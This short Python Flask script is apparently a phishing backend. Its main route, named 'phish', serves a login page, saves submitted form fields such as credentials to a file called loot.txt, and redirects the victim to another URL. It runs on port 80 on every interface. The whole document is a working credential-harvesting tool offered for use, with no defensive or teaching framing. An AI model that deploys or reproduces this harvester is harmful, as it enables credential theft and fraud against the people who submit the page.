# /usr/bin/env python

from flask import url_for,Flask, request, redirect, render_template

import config

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def phish():
    if request.method == "POST":
        for field in request.form:
            if config.DEBUG:
                loot = field + "=" + request.form[field]
                print loot
                with open("loot.txt", "a") as log:
                    log.write(loot + "\n")
            elif field in config.TO_LOG:
                loot = field + "=" + request.form[field]
                print loot
                with open("loot.txt", "a") as log:
                    log.write(loot + "\n")
        with open("loot.txt", "a") as log:
            log.write("************\n")
        return redirect(config.REDIRECT_URL)
    return render_template("index.html")

app.run(host="0.0.0.0", port="80")

